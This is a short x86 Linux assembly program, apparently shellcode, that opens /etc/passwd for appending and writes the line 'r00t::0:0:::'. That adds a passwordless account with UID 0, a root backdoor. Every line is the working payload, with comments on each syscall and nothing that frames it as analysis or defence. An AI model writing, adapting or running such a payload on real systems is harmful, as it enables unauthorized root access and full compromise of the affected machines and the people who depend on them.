section .text

    global _start

_start:
    ; open("/etc//passwd", O_WRONLY | O_APPEND)
    xor     eax, eax
    push    eax
    add     al, 0x5
    push    0x64777373
    push    0x61702f2f
    push    0x6374652f
    mov     ebx, esp
    xor     ecx, ecx
    mov     cx, 02001Q
    int     0x80
    mov     ebx, eax

    ; write(ebx, "r00t::0:0:::", 12)
    add     al, 1
    xor     edx, edx
    push    edx
    push    0x3a3a3a30
    push    0x3a303a3a
    push    0x74303072
    mov     ecx, esp
    push    byte 12
    pop     edx
    int     0x80

    ; close(ebx)
    sub     al, 6
    int     0x80

    ; exit()
    add     al, 1
    int     0x80

